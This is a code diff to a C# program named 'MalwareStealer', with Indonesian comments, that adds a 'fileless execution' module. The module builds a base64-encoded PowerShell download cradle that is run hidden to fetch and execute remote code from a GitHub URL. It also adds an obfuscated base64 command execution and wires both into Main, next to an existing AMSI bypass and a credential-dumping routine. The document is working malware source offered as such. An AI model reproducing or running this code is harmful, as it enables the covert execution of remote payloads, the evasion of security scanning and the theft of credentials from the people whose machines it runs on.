@@ -371,6 +371,78 @@ namespace MalwareStealer
             catch { return "[[DECRYPT FAILED]]"; }
         }
 
+        // ===== MODUL 4: FILELESS EXECUTION =====
+
+        // 1. PowerShell Download Cradle (download & execute di memory)
+        static void ExecuteDownloadCradle(string url)
+        {
+            try
+            {
+                Console.WriteLine("[+] Menjalankan Download Cradle...");
+                
+                string cradle = string.Format(
+                    "IEX (New-Object Net.WebClient).DownloadString('{0}')",
+                    url
+                );
+                
+                byte[] bytes = Encoding.Unicode.GetBytes(cradle);
+                string encoded = Convert.ToBase64String(bytes);
+                
+                string psCommand = string.Format(
+                    "powershell -nop -w hidden -enc {0}",
+                    encoded
+                );
+                
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = "powershell.exe";
+                psi.Arguments = psCommand;
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.RedirectStandardOutput = true;
+                
+                Process p = Process.Start(psi);
+                p.WaitForExit(5000);
+                
+                Console.WriteLine("[+] Download Cradle selesai.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Error: " + ex.Message);
+            }
+        }
+
+        // 2. Obfuscated Execution (whoami)
+        static void ExecuteObfuscated()
+        {
+            try
+            {
+                Console.WriteLine("[+] Menjalankan Obfuscated Execution...");
+                
+                string encoded = "d2hvYW1p";
+                string command = string.Format(
+                    "powershell -nop -c \"IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('{0}')))\"",
+                    encoded
+                );
+                
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = "powershell.exe";
+                psi.Arguments = command;
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.RedirectStandardOutput = true;
+                
+                Process p = Process.Start(psi);
+                p.WaitForExit(5000);
+                
+                string output = p.StandardOutput.ReadToEnd();
+                Console.WriteLine("[+] Output: " + output);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Error: " + ex.Message);
+            }
+        }
+
         // ===== DUMP DATA (DENGAN HASH FALLBACK) =====
         static void DumpData(byte[] masterKey)
         {
@@ -460,12 +532,21 @@ namespace MalwareStealer
             Console.ReadKey();
         }
 
-        // ===== MAIN =====
+        // ===== MAIN (UPDATED WITH MODULE 4) =====
         static void Main()
         {
             BypassAMSI();
             Console.WriteLine("[+] Malware Stealer Aktif!");
-
+            Console.WriteLine("[+] Modul 4: Fileless Execution");
+            
+            // 1. Download Cradle (download Stealer.cs dari GitHub)
+            string githubUrl = "https://raw.githubusercontent.com/dailam008/stealer/main/Stealer.cs";
+            ExecuteDownloadCradle(githubUrl);
+            
+            // 2. Obfuscated Execution
+            ExecuteObfuscated();
+            
+            // 3. Stealer (seperti biasa)
             byte[] masterKey = null;
 
             // 1. COBA DEBUGGER
